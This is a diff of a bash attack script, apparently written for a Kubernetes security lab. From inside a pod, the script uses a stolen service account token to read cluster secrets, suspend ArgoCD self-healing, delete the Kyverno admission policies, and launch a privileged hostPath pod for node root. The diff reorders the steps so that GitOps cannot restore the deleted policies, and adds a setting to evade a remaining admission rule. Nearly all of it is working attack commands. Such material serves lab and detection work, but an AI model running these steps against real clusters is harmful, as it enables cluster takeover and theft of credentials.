@@ -1,6 +1,6 @@
 #!/bin/bash
 # =============================================================================
-# Scenario 1 — Privilege Escalation via Service Account Abuse
+# Scenario 1 — Privilege Escalation
 # attack.sh — runs inside target-app pod using stolen cluster-admin token
 # =============================================================================
 
@@ -22,7 +22,7 @@ CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
 
 # ── Step 1: Read service account token ───────────────────────────────────────
 emit "ATTACK" "WARNING" \
-  "Pod reading mounted service account token" \
+  "Pod reading available mounted service account token" \
   "Token is readable at /var/run/secrets/kubernetes.io/serviceaccount/token by any process inside the container — including an attacker with exec access."
 
 TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "")
@@ -56,32 +56,13 @@ emit "ATTACK" "CRITICAL" \
   "$SECRET_COUNT cluster secrets now readable" \
   "kubectl get secrets --all-namespaces returns $SECRET_COUNT secrets including TLS certificates, database passwords, image pull credentials, and other workload secrets across every namespace."
 
-# ── Step 4: Delete Kyverno policy — no-privileged-containers ─────────────────
-emit "ATTACK" "CRITICAL" \
-  "Deleting Kyverno policy: no-privileged-containers" \
-  "Removing admission policy blocking privileged pod creation. Once deleted, any new pod can request privileged: true — giving it root on the node."
-
-kubectl delete clusterpolicy no-privileged-containers \
-  --token="$TOKEN" \
-  --server="$APISERVER" \
-  --certificate-authority="$CA" \
-  --ignore-not-found=true
-
-# ── Step 5: Delete Kyverno policy — no-hostpath-mount ────────────────────────
-emit "ATTACK" "CRITICAL" \
-  "Deleting Kyverno policy: no-hostpath-mount" \
-  "Removing policy preventing node filesystem mounts. Both admission policies are now gone — Kyverno has no rules left to enforce against this attacker."
-
-kubectl delete clusterpolicy no-hostpath-mount \
-  --token="$TOKEN" \
-  --server="$APISERVER" \
-  --certificate-authority="$CA" \
-  --ignore-not-found=true
-
-# ── Step 6: Suspend ArgoCD sync ───────────────────────────────────────────────
+# ── Step 4: Suspend ArgoCD sync FIRST ─────────────────────────────────────────
+# Disable GitOps self-heal BEFORE deleting policies. Otherwise ArgoCD's
+# selfHeal loop re-creates each deleted policy within ~3s — restoring admission
+# control before the privileged pod is created and breaking the attack chain.
 emit "ATTACK" "CRITICAL" \
   "Disabling GitOps recovery — suspending ArgoCD sync" \
-  "Patching ArgoCD Application objects to disable automated sync. Once suspended, ArgoCD will detect drift but take no action. The deleted policies will not be restored automatically."
+  "Patching ArgoCD Application objects to disable automated sync. Once suspended, ArgoCD will detect drift but take no action. Policies deleted next will NOT be restored automatically."
 
 kubectl patch application secops-lab \
   --token="$TOKEN" \
@@ -101,7 +82,33 @@ kubectl patch application secops-lab-policies \
 
 emit "ATTACK" "CRITICAL" \
   "ArgoCD sync suspended — automated recovery disabled" \
-  "GitOps is now blind. ArgoCD will show OutOfSync but will not reconcile. The attacker has broken the self-healing loop. No automated remediation will occur until sync is manually re-enabled."
+  "GitOps is now blind. ArgoCD will show OutOfSync but will not reconcile. The attacker has broken the self-healing loop before tampering with admission control."
+
+# Allow the suspend to register with the ArgoCD application controller before
+# deleting policies, so selfHeal does not race the deletes.
+sleep 3
+
+# ── Step 5: Delete Kyverno policy — no-privileged-containers ─────────────────
+emit "ATTACK" "CRITICAL" \
+  "Deleting Kyverno policy: no-privileged-containers" \
+  "Removing admission policy blocking privileged pod creation. Once deleted, any new pod can request privileged: true — giving it root on the node."
+
+kubectl delete clusterpolicy no-privileged-containers \
+  --token="$TOKEN" \
+  --server="$APISERVER" \
+  --certificate-authority="$CA" \
+  --ignore-not-found=true
+
+# ── Step 6: Delete Kyverno policy — no-hostpath-mount ────────────────────────
+emit "ATTACK" "CRITICAL" \
+  "Deleting Kyverno policy: no-hostpath-mount" \
+  "Removing policy preventing node filesystem mounts. Both admission policies are now gone — Kyverno has no rules left to enforce against this attacker."
+
+kubectl delete clusterpolicy no-hostpath-mount \
+  --token="$TOKEN" \
+  --server="$APISERVER" \
+  --certificate-authority="$CA" \
+  --ignore-not-found=true
 
 # ── Step 7: Create privileged pod ────────────────────────────────────────────
 emit "ATTACK" "CRITICAL" \
@@ -124,6 +131,10 @@ metadata:
 spec:
   hostPID: true
   hostNetwork: true
+  # Evade disallow-automount-sa-token: this pod gets node root via hostPath, so
+  # it needs no Kubernetes API token. Without this the pod is rejected even after
+  # no-privileged-containers / no-hostpath-mount are deleted.
+  automountServiceAccountToken: false
   containers:
     - name: attacker
       image: alpine:latest
